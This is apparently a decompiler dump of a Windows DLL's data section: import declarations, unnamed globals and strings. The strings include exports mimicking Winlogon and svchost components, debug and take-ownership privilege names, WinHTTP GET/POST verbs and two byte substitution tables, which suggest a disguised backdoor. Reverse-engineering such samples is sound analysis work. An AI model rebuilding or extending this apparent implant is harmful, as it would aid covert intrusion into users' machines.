// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern _UNKNOWN `std::string::_Nullstr'::`2'::_C; weak
// extern _UNKNOWN std::string::npos; weak
// extern void *(__cdecl *realloc)(void *Block, size_t Size);
// extern void *(__cdecl *malloc)(size_t Size);
// extern int (__cdecl *strncmp)(const char *Str1, const char *Str2, size_t MaxCount);
// extern int (__cdecl *atoi)(const char *String);
// extern char *(__cdecl *strncat)(char *Destination, const char *Source, size_t Count);
// extern void (__cdecl *free)(void *Block);
// extern void (__cdecl *srand)(unsigned int Seed);
// extern char *(__cdecl *strtok)(char *String, const char *Delimiter);
// extern __time32_t (__cdecl *time)(__time32_t *const Time);
// extern int (__cdecl *rand)();
// extern int (__cdecl *strcmpi)(const char *String1, const char *String2);
int (*off_100101F0[3])() = { &sub_10001073, &sub_10001077, &sub_1000107B }; // weak
void *off_10010200 = &purecall; // weak
int (__thiscall *off_1001021C)(void *, char) = &sub_10001145; // weak
int (*off_1001029C[3])() = { &sub_10001B58, &sub_10001B45, &sub_10001B54 }; // weak
int (*off_100102B0[3])() = { &sub_10001B58, &sub_10001B45, &sub_10001B54 }; // weak
int (__stdcall *off_100102C4)(int, LPCVOID lpBuffer, int Buffer, void *) = &sub_1000E539; // weak
int (__thiscall *off_100102DC)(void *, char) = &sub_10002590; // weak
_UNKNOWN unk_10010394; // weak
int (*off_100103B8[3])() = { &sub_10001B58, &sub_10001B45, &sub_10001B54 }; // weak
int (__thiscall *off_1001051C)(void *, char) = &sub_10006562; // weak
int (*off_10010610[3])() = { &sub_1000771E, &sub_100077CD, &sub_100077D1 }; // weak
void *_com_error::`vftable' = &sub_1000837B; // weak
int (__thiscall *off_1001073C[2])(void *, char) = { &sub_1000C3C6, &sub_1000C772 }; // weak
int (__thiscall *off_10010740)(void *, char) = &sub_1000C772; // weak
int (__thiscall *off_100108A8)(void *, char) = &sub_1000EAC0; // weak
void *(__thiscall *off_100108C8)(std::locale::facet *__hidden this, char) = &std::locale::facet::`scalar deleting destructor'; // weak
const _ThrowInfo _TI1_AV_com_error__ = { 0u, &sub_100083C4, NULL, &_CTA1_AV_com_error__ }; // idb
int USER32_dll_import_table = 0; // weak
int ADVAPI32_dll_import_table = 0; // weak
int OLEAUT32_dll_import_table = 0; // weak
int WINHTTP_dll_import_table = 0; // weak
int urlmon_dll_import_table = 0; // weak
_UNKNOWN unk_10013100; // weak
_UNKNOWN unk_10013124; // weak
_UNKNOWN unk_10013148; // weak
_UNKNOWN unk_10013164; // weak
_UNKNOWN unk_10013184; // weak
_UNKNOWN unk_100131A8; // weak
_UNKNOWN unk_100131D0; // weak
_UNKNOWN unk_10013208; // weak
_UNKNOWN unk_10013238; // weak
_UNKNOWN unk_1001326C; // weak
_UNKNOWN unk_100132AC; // weak
_UNKNOWN unk_100132C8; // weak
_UNKNOWN unk_100132F0; // weak
_UNKNOWN unk_1001331C; // weak
_UNKNOWN unk_10013348; // weak
_UNKNOWN unk_1001337C; // weak
_UNKNOWN unk_100133B0; // weak
_UNKNOWN unk_100133E0; // weak
_UNKNOWN unk_10013408; // weak
_UNKNOWN unk_10013428; // weak
_UNKNOWN unk_1001345C; // weak
char (*off_10013498)[4] = &String2; // weak
_UNKNOWN unk_1001349C; // weak
_UNKNOWN unk_100134C4; // weak
_UNKNOWN unk_100134E8; // weak
_UNKNOWN unk_10013514; // weak
_UNKNOWN unk_10013540; // weak
_UNKNOWN unk_1001356C; // weak
_UNKNOWN unk_10013598; // weak
_UNKNOWN unk_100135C4; // weak
_UNKNOWN unk_100135F0; // weak
_UNKNOWN unk_10013614; // weak
_UNKNOWN unk_10013638; // weak
_UNKNOWN unk_10013660; // weak
_UNKNOWN unk_10013688; // weak
_UNKNOWN unk_100136B0; // weak
_UNKNOWN unk_100136D8; // weak
_UNKNOWN unk_100136F8; // weak
_UNKNOWN unk_10013718; // weak
_UNKNOWN unk_10013738; // weak
_UNKNOWN unk_10013758; // weak
_UNKNOWN unk_10013778; // weak
_UNKNOWN unk_10013798; // weak
_UNKNOWN unk_100137B8; // weak
_UNKNOWN unk_100137D8; // weak
_UNKNOWN unk_100137F4; // weak
_UNKNOWN unk_10013814; // weak
_UNKNOWN unk_10013834; // weak
_UNKNOWN unk_10013850; // weak
_UNKNOWN unk_1001386C; // weak
_UNKNOWN unk_1001388C; // weak
_UNKNOWN unk_100138C4; // weak
_UNKNOWN unk_100138E0; // weak
_UNKNOWN unk_100138FC; // weak
_UNKNOWN unk_10013920; // weak
_UNKNOWN unk_10013944; // weak
_UNKNOWN unk_10013964; // weak
_UNKNOWN unk_10013984; // weak
_UNKNOWN unk_100139A4; // weak
_UNKNOWN unk_100139CC; // weak
char String1[2] = "0"; // idb
_UNKNOWN unk_100139FC; // weak
_UNKNOWN unk_10013A18; // weak
char Str2[2] = "1"; // idb
_UNKNOWN unk_10013A38; // weak
_UNKNOWN unk_10013A68; // weak
char a12[13] = "|^^!^^!^^|12"; // weak
_UNKNOWN unk_10013ACC; // weak
_UNKNOWN unk_10013AEC; // weak
_UNKNOWN unk_10013B1C; // weak
_UNKNOWN unk_10013B40; // weak
_UNKNOWN unk_10013B74; // weak
_UNKNOWN unk_10013B9C; // weak
_UNKNOWN unk_10013BCC; // weak
_UNKNOWN unk_10013BF4; // weak
_UNKNOWN unk_10013C24; // weak
_UNKNOWN unk_10013C4C; // weak
_UNKNOWN unk_10013C7C; // weak
_UNKNOWN unk_10013CA0; // weak
_UNKNOWN unk_10013CD0; // weak
_UNKNOWN unk_10013CF8; // weak
_UNKNOWN unk_10013D28; // weak
_UNKNOWN unk_10013D50; // weak
_UNKNOWN unk_10013D6C; // weak
_UNKNOWN unk_10013D88; // weak
_UNKNOWN unk_10013DA4; // weak
_UNKNOWN unk_10013DC0; // weak
_UNKNOWN unk_10013DDC; // weak
_UNKNOWN unk_10013E00; // weak
_UNKNOWN unk_10013E24; // weak
_UNKNOWN unk_10013E48; // weak
_UNKNOWN unk_10013E6C; // weak
_UNKNOWN unk_10013E90; // weak
_UNKNOWN unk_10013EBC; // weak
_UNKNOWN unk_10013EE4; // weak
_UNKNOWN unk_10013F0C; // weak
_UNKNOWN unk_10013F2C; // weak
_UNKNOWN unk_10013F4C; // weak
_UNKNOWN unk_10013F74; // weak
_UNKNOWN unk_10013F9C; // weak
_UNKNOWN unk_10013FBC; // weak
_UNKNOWN unk_10013FDC; // weak
_UNKNOWN unk_10014000; // weak
_UNKNOWN unk_10014024; // weak
_UNKNOWN unk_10014048; // weak
_UNKNOWN unk_10014070; // weak
_UNKNOWN unk_10014098; // weak
_UNKNOWN unk_100140B4; // weak
_UNKNOWN unk_100140D0; // weak
_UNKNOWN unk_100140F4; // weak
_UNKNOWN unk_10014120; // weak
_UNKNOWN unk_10014150; // weak
_UNKNOWN unk_10014180; // weak
_UNKNOWN unk_100141AC; // weak
_UNKNOWN unk_100141D8; // weak
_UNKNOWN unk_10014204; // weak
_UNKNOWN unk_10014230; // weak
_UNKNOWN unk_10014280; // weak
_UNKNOWN unk_100142AC; // weak
_UNKNOWN unk_100142D8; // weak
_UNKNOWN unk_10014334; // weak
_UNKNOWN unk_1001435C; // weak
_UNKNOWN unk_10014388; // weak
_UNKNOWN unk_100143B0; // weak
_UNKNOWN unk_100143DC; // weak
_UNKNOWN unk_1001440C; // weak
_UNKNOWN unk_10014444; // weak
_UNKNOWN unk_10014474; // weak
_UNKNOWN unk_10014494; // weak
_UNKNOWN unk_100144B8; // weak
_UNKNOWN unk_100144E8; // weak
_UNKNOWN unk_10014510; // weak
_UNKNOWN unk_10014578; // weak
_UNKNOWN unk_100145E0; // weak
_UNKNOWN unk_10014604; // weak
_UNKNOWN unk_10014620; // weak
_UNKNOWN unk_10014688; // weak
_UNKNOWN unk_100146F0; // weak
_UNKNOWN unk_10014724; // weak
_UNKNOWN unk_10014794; // weak
_UNKNOWN unk_100147C0; // weak
_UNKNOWN unk_100147EC; // weak
_UNKNOWN unk_10014818; // weak
char ProcName[] = "NotifyLogoffUser"; // idb
_UNKNOWN unk_10014854; // weak
char aNotifylogonuse_0[] = "NotifyLogonUser"; // idb
char aServicemain_0[] = "ServiceMain"; // idb
char aLcecontrolserv_0[] = "LCEControlServer"; // idb
char aRegistertheeve_1[] = "RegisterTheEventServiceDuringSetup"; // idb
char aRegistertheeve_2[] = "RegisterTheEventServiceAfterSetup"; // idb
char aRegisterthefri_1[] = "RegisterTheFrigginEventServiceDuringSetup"; // idb
char aRegisterthefri_2[] = "RegisterTheFrigginEventServiceAfterSetup"; // idb
char aO3[] = "O3"; // idb
char aPeruserinit_0[] = "PerUserInit"; // idb
char aDllinstall_0[] = "DllInstall"; // idb
char aRestoremydocsf_0[] = "RestoreMyDocsFolder"; // idb
char aCreateshareddo_0[] = "CreateSharedDocuments"; // idb
char aSvchostpushser_0[] = "SvchostPushServiceGlobals"; // idb
_UNKNOWN unk_100149A8; // weak
_UNKNOWN unk_100149CC; // weak
_UNKNOWN unk_100149F4; // weak
_UNKNOWN unk_10014A1C; // weak
_UNKNOWN unk_10014A40; // weak
_UNKNOWN unk_10014A60; // weak
_UNKNOWN unk_10014A88; // weak
_UNKNOWN unk_10014AAC; // weak
_UNKNOWN unk_10014AD8; // weak
_UNKNOWN unk_10014B04; // weak
_UNKNOWN unk_10014B2C; // weak
_UNKNOWN unk_10014B54; // weak
_UNKNOWN unk_10014B78; // weak
_UNKNOWN unk_10014B9C; // weak
_UNKNOWN unk_10014BCC; // weak
_UNKNOWN unk_10014BF4; // weak
_UNKNOWN unk_10014C18; // weak
_UNKNOWN unk_10014C40; // weak
_UNKNOWN unk_10014C70; // weak
_UNKNOWN unk_10014C94; // weak
IID stru_10014CC8 = { 485667104u, 21629u, 4123u, { 142u, 101u, 8u, 0u, 43u, 43u, 209u, 25u } }; // weak
_UNKNOWN unk_10014CD8; // weak
char byte_10014D28[256] =
{
  '\xA9',
  'g',
  '\xB3',
  '\xE8',
  '\x04',
  '\xFD',
  '\xA3',
  'v',
  '\x9A',
  '\x92',
  '\x80',
  'x',
  '\xE4',
  '\xDD',
  '\xD1',
  '8',
  '\r',
  '\xC6',
  '5',
  '\x98',
  '\x18',
  '\xF7',
  '\xEC',
  'l',
  'C',
  'u',
  '7',
  '&',
  '\xFA',
  '\x13',
  '\x94',
  'H',
  '\xF2',
  '\xD0',
  '\x8B',
  '0',
  '\x84',
  'T',
  '\xDF',
  '#',
  '\x19',
  '[',
  '=',
  'Y',
  '\xF3',
  '\xAE',
  '\xA2',
  '\x82',
  'c',
  '\x01',
  '\x83',
  '.',
  '\xD9',
  'Q',
  '\x9B',
  '|',
  '\xA6',
  '\xEB',
  '\xA5',
  '\xBE',
  '\x16',
  '\f',
  '\xE3',
  'a',
  '\xC0',
  '\x8C',
  ':',
  '\xF5',
  's',
  ',',
  '%',
  '\v',
  '\xBB',
  'N',
  '\x89',
  'k',
  'S',
  'j',
  '\xB4',
  '\xF1',
  '\xE1',
  '\xE6',
  '\xBD',
  'E',
  '\xE2',
  '\xF4',
  '\xB6',
  'f',
  '\xCC',
  '\x95',
  '\x03',
  'V',
  '\xD4',
  '\x1C',
  '\x1E',
  '\xD7',
  '\xFB',
  '\xC3',
  '\x8E',
  '\xB5',
  '\xE9',
  '\xCF',
  '\xBF',
  '\xBA',
  '\xEA',
  'w',
  '9',
  '\xAF',
  '3',
  '\xC9',
  'b',
  'q',
  '\x81',
  'y',
  '\t',
  '\xAD',
  '$',
  '\xCD',
  '\xF9',
  '\xD8',
  '\xE5',
  '\xC5',
  '\xB9',
  'M',
  'D',
  '\b',
  '\x86',
  '\xE7',
  '\xA1',
  '\x1D',
  '\xAA',
  '\xED',
  '\x06',
  'p',
  '\xB2',
  '\xD2',
  'A',
  '{',
  '\xA0',
  '\x11',
  '1',
  '\xC2',
  '\'',
  '\x90',
  ' ',
  '\xF6',
  '`',
  '\xFF',
  '\x96',
  '\\',
  '\xB1',
  '\xAB',
  '\x9E',
  '\x9C',
  'R',
  '\x1B',
  '_',
  '\x93',
  '\n',
  '\xEF',
  '\x91',
  '\x85',
  'I',
  '\xEE',
  '-',
  'O',
  '\x8F',
  ';',
  'G',
  '\x87',
  'm',
  'F',
  '\xD6',
  '>',
  'i',
  'd',
  '*',
  '\xCE',
  '\xCB',
  '/',
  '\xFC',
  '\x97',
  '\x05',
  'z',
  '\xAC',
  '\x7F',
  '\xD5',
  '\x1A',
  'K',
  '\x0E',
  '\xA7',
  'Z',
  '(',
  '\x14',
  '?',
  ')',
  '\x88',
  '<',
  'L',
  '\x02',
  '\xB8',
  '\xDA',
  '\xB0',
  '\x17',
  'U',
  '\x1F',
  '\x8A',
  '}',
  'W',
  '\xC7',
  '\x8D',
  't',
  '\xB7',
  '\xC4',
  '\x9F',
  'r',
  '~',
  '\x15',
  '\"',
  '\x12',
  'X',
  '\a',
  '\x99',
  '4',
  'n',
  'P',
  '\xDE',
  'h',
  'e',
  '\xBC',
  '\xDB',
  '\xF8',
  '\xC8',
  '\xA8',
  '+',
  '@',
  '\xDC',
  '\xFE',
  '2',
  '\xA4',
  '\xCA',
  '\x10',
  '!',
  '\xF0',
  '\xD3',
  ']',
  '\x0F',
  '\0',
  'o',
  '\x9D',
  '6',
  'B',
  'J',
  '^',
  '\xC1',
  '\xE0'
}; // weak
char byte_10014E28[256] =
{
  'u',
  '\xF3',
  '\xC6',
  '\xF4',
  '\xDB',
  '{',
  '\xFB',
  '\xC8',
  'J',
  '\xD3',
  '\xE6',
  'k',
  'E',
  '}',
  '\xE8',
  'K',
  '\xD6',
  '2',
  '\xD8',
  '\xFD',
  '7',
  'q',
  '\xF1',
  '\xE1',
  '0',
  '\x0F',
  '\xF8',
  '\x1B',
  '\x87',
  '\xFA',
  '\x06',
  '?',
  '^',
  '\xBA',
  '\xAE',
  '[',
  '\x8A',
  '\0',
  '\xBC',
  '\x9D',
  'm',
  '\xC1',
  '\xB1',
  '\x0E',
  '\x80',
  ']',
  '\xD2',
  '\xD5',
  '\xA0',
  '\x84',
  '\a',
  '\x14',
  '\xB5',
  '\x90',
  ',',
  '\xA3',
  '\xB2',
  's',
  'L',
  'T',
  '\x92',
  't',
  '6',
  'Q',
  '8',
  '\xB0',
  '\xBD',
  'Z',
  '\xFC',
  '`',
  'b',
  '\x96',
  'l',
  'B',
  '\xF7',
  '\x10',
  '|',
  '(',
  '\'',
  '\x8C',
  '\x13',
  '\x95',
  '\x9C',
  '\xC7',
  '$',
  'F',
  ';',
  'p',
  '\xCA',
  '\xE3',
  '\x85',
  '\xCB',
  '\x11',
  '\xD0',
  '\x93',
  '\xB8',
  '\xA6',
  '\x83',
  ' ',
  '\xFF',
  '\x9F',
  'w',
  '\xC3',
  '\xCC',
  '\x03',
  'o',
  '\b',
  '\xBF',
  '@',
  '\xE7',
  '+',
  '\xE2',
  'y',
  '\f',
  '\xAA',
  '\x82',
  'A',
  ':',
  '\xEA',
  '\xB9',
  '\xE4',
  '\x9A',
  '\xA4',
  '\x97',
  '~',
  '\xDA',
  'z',
  '\x17',
  'f',
  '\x94',
  '\xA1',
  '\x1D',
  '=',
  '\xF0',
  '\xDE',
  '\xB3',
  '\v',
  'r',
  '\xA7',
  '\x1C',
  '\xEF',
  '\xD1',
  'S',
  '>',
  '\x8F',
  '3',
  '&',
  '_',
  '\xEC',
  'v',
  '*',
  'I',
  '\x81',
  '\x88',
  '\xEE',
  '!',
  '\xC4',
  '\x1A',
  '\xEB',
  '\xD9',
  '\xC5',
  '9',
  '\x99',
  '\xCD',
  '\xAD',
  '1',
  '\x8B',
  '\x01',
  '\x18',
  '#',
  '\xDD',
  '\x1F',
  'N',
  '-',
  '\xF9',
  'H',
  'O',
  '\xF2',
  'e',
  '\x8E',
  'x',
  '\\',
  'X',
  '\x19',
  '\x8D',
  '\xE5',
  '\x98',
  'W',
  'g',
  '\x7F',
  '\x05',
  'd',
  '\xAF',
  'c',
  '\xB6',
  '\xFE',
  '\xF5',
  '\xB7',
  '<',
  '\xA5',
  '\xCE',
  '\xE9',
  'h',
  'D',
  '\xE0',
  'M',
  'C',
  'i',
  ')',
  '.',
  '\xAC',
  '\x15',
  'Y',
  '\xA8',
  '\n',
  '\x9E',
  'n',
  'G',
  '\xDF',
  '4',
  '5',
  'j',
  '\xCF',
  '\xDC',
  '\"',
  '\xC9',
  '\xC0',
  '\x9B',
  '\x89',
  '\xD4',
  '\xED',
  '\xAB',
  '\x12',
  '\xA2',
  '\r',
  'R',
  '\xBB',
  '\x02',
  '/',
  '\xA9',
  '\xD7',
  'a',
  '\x1E',
  '\xB4',
  'P',
  '\x04',
  '\xF6',
  '\xC2',
  '\x16',
  '%',
  '\x86',
  'V',
  'U',
  '\t',
  '\xBE',
  '\x91'
}; // weak
int dword_10014F28 = 1; // weak
int dword_10014F2C[4] = { 0, 16, 16, 16 }; // weak
_UNKNOWN unk_10014F40; // weak
_UNKNOWN unk_10014F90; // weak
_UNKNOWN unk_10014FB8; // weak
_UNKNOWN unk_10015010; // weak
CHAR aSetakeownershi[] = "SeTakeOwnershipPrivilege"; // idb
CHAR Name[] = "SeRestorePrivilege"; // idb
_UNKNOWN unk_10015068; // weak
_UNKNOWN unk_1001508C; // weak
_UNKNOWN unk_100150C0; // weak
_UNKNOWN unk_100150E4; // weak
_UNKNOWN unk_10015110; // weak
_UNKNOWN unk_10015138; // weak
_UNKNOWN unk_10015168; // weak
_UNKNOWN unk_10015198; // weak
_UNKNOWN unk_100151C4; // weak
_UNKNOWN unk_100151F4; // weak
_UNKNOWN unk_1001521C; // weak
_UNKNOWN unk_10015244; // weak
_UNKNOWN unk_1001526C; // weak
_UNKNOWN unk_10015298; // weak
_UNKNOWN unk_100152C8; // weak
_UNKNOWN unk_100152F8; // weak
char aSedebugprivile[17] = "SeDebugPrivilege"; // weak
_UNKNOWN unk_10015334; // weak
_UNKNOWN unk_1001535C; // weak
_UNKNOWN unk_10015380; // weak
_UNKNOWN unk_100153A8; // weak
CHAR ModuleName[] = "KERNEL32.DLL"; // idb
_UNKNOWN unk_100153E0; // weak
_UNKNOWN unk_10015414; // weak
_UNKNOWN unk_10015430; // weak
_UNKNOWN unk_10015458; // weak
_UNKNOWN unk_1001547C; // weak
_UNKNOWN unk_100154A0; // weak
WCHAR aPost[] = L"POST"; // idb
WCHAR pwszVerb[] = L"GET"; // idb
_UNKNOWN unk_10015508; // weak
_UNKNOWN unk_10015530; // weak
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern LSTATUS (__stdcall *RegQueryInfoKeyA)(HKEY hKey, LPSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
// extern BOOL (__stdcall *CreateProcessAsUserA)(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegEnumKeyExA)(HKEY hKey, DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
// extern BOOL (__stdcall *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
// extern BOOL (__stdcall *LookupAccountSidA)(LPCSTR lpSystemName, PSID Sid, LPSTR Name, LPDWORD cchName, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
// extern BOOL (__stdcall *SetSecurityDescriptorDacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted);
// extern BOOL (__stdcall *InitializeSecurityDescriptor)(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegDeleteValueA)(HKEY hKey, LPCSTR lpValueName);
// extern PVOID (__stdcall *FreeSid)(PSID pSid);
// extern DWORD (__stdcall *SetNamedSecurityInfoA)(LPSTR pObjectName, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern BOOL (__stdcall *LookupPrivilegeValueA)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// extern DWORD (__stdcall *SetEntriesInAclA)(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_A pListOfExplicitEntries, PACL OldAcl, PACL *NewAcl);
// extern BOOL (__stdcall *AllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
// extern DWORD (__stdcall *GetNamedSecurityInfoA)(LPCSTR pObjectName, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID *ppsidOwner, PSID *ppsidGroup, PACL *ppDacl, PACL *ppSacl, PSECURITY_DESCRIPTOR *ppSecurityDescriptor);
// extern HRESULT (__stdcall *SetErrorInfo)(ULONG dwReserved, IErrorInfo *perrinfo);
// extern BSTR (__stdcall *SysAllocString)(const OLECHAR *psz);
// extern void (__stdcall *SysFreeString)(BSTR bstrString);
// extern void (__stdcall *VariantInit)(VARIANTARG *pvarg);
// extern UINT (__stdcall *SysStringLen)(BSTR pbstr);
// extern HRESULT (__stdcall *VariantChangeType)(VARIANTARG *pvargDest, const VARIANTARG *pvarSrc, USHORT wFlags, VARTYPE vt);
// extern HRESULT (__stdcall *CreateErrorInfo)(ICreateErrorInfo **pperrinfo);
// extern HRESULT (__stdcall *VariantClear)(VARIANTARG *pvarg);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
// extern BOOL (__stdcall *WinHttpCloseHandle)(HINTERNET hInternet);
// extern BOOL (__stdcall *WinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
// extern BOOL (__stdcall *WinHttpQueryDataAvailable)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
// extern BOOL (__stdcall *WinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
// extern BOOL (__stdcall *WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
// extern HINTERNET (__stdcall *WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
// extern HINTERNET (__stdcall *WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
// extern HINTERNET (__stdcall *WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
// extern BOOL (__stdcall *WinHttpCheckPlatform)();
// extern HRESULT (__stdcall *ObtainUserAgentString)(DWORD dwOption, LPSTR pszUAOut, DWORD *cbSize);
LPCSTR dword_10015608 = NULL; // idb
int dword_1001560C = 0; // weak
int dword_10015610 = 0; // weak
int dword_10015614 = 0; // weak
LPCSTR lpPrefixString = NULL; // idb
char String2[4] = { '\0', '\0', '\0', '\0' }; // idb
char *dword_10015620 = NULL; // idb
int dword_10015624 = 0; // weak
int dword_10015628 = 0; // weak
char *dword_1001562C = NULL; // idb
char *dword_10015630 = NULL; // idb
int dword_10015634 = 0; // weak
LPCSTR lpString2 = NULL; // idb
char *dword_1001563C = NULL; // idb
char *dword_10015640 = NULL; // idb
char *Str = NULL; // idb
char *dword_10015648 = NULL; // idb
int dword_1001564C = 0; // weak
int dword_10015650 = 0; // weak
int dword_10015654 = 0; // weak
int dword_10015658 = 0; // weak
int dword_1001565C = 0; // weak
LPCSTR dword_10015660 = NULL; // idb
LPCSTR lpLibFileName = NULL; // idb
char *dword_10015668 = NULL; // idb
LPCSTR lpString = NULL; // idb
int dword_10015670 = 0; // weak
int dword_10015674 = 0; // weak
int dword_10015678 = 0; // weak
int dword_1001567C = 0; // weak
int dword_10015680 = 0; // weak
int dword_10015684 = 0; // weak
int dword_10015688 = 0; // weak
int dword_1001568C = 0; // weak
int dword_10015690 = 0; // weak
int dword_10015694 = 0; // weak
int Val = 0; // idb
int dword_1001569C = 0; // idb
char Buffer[16] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_10015730[16] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
int (__stdcall *dword_10015740)(_DWORD) = NULL; // weak
CHAR String[4] = { '\0', '\0', '\0', '\0' }; // idb
LPCSTR lpValueName = NULL; // idb
LPCSTR dword_1001574C = NULL; // idb
int dword_10015750 = 0; // weak
LPCSTR dword_10015754 = NULL; // idb
LPCSTR dword_10015758 = NULL; // idb
int dword_1001575C = 0; // weak
LPCSTR dword_10015760 = NULL; // idb
LPCSTR lpSubKey = NULL; // idb
LPCSTR dword_10015768 = NULL; // idb
LPCSTR dword_1001576C = NULL; // idb
int dword_10015770 = 0; // weak
int dword_10015774 = 0; // weak
int dword_10015778 = 0; // weak
int dword_1001577C = 0; // weak
int dword_10015780 = 0; // weak
int dword_10015784 = 0; // weak
int dword_10015788 = 0; // idb
int dword_1001578C = 0; // weak
int dword_10015790 = 0; // weak
int dword_10015794 = 0; // weak
int dword_10015798 = 0; // weak
int dword_1001579C = 0; // weak
int dword_100157A0 = 0; // weak
LPCSTR dword_100157A4 = NULL; // idb
HMODULE hModule = NULL; // idb
char Filename[264] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
HANDLE hHandle; // idb
HANDLE hObject; // idb
int dword_100158BC; // weak
int (*dword_100158C0)(void); // weak
int (__stdcall *dword_100158C4)(_DWORD, _DWORD, _DWORD); // weak
int (*dword_100158C8)(void); // weak
int (*dword_100158CC)(void); // weak
HMODULE dword_100158D0; // idb
HMODULE hLibModule; // idb
HMODULE dword_100158D8; // idb
int dword_100158DC; // weak
int dword_100158E0; // weak
int dword_100158E4; // weak
HANDLE dword_100158E8; // idb
HANDLE hEvent; // idb
HKEY dword_100158F0; // idb
CHAR byte_100158F4[256]; // idb
CHAR ValueName[264]; // idb
CHAR LibFileName[264]; // idb
CHAR byte_10015C04[264]; // idb
CHAR byte_10015D0C[256]; // idb
HKEY hKey; // idb
CHAR SubKey[256]; // idb
CHAR byte_10015F10[272]; // idb
HMODULE dword_10016020; // idb
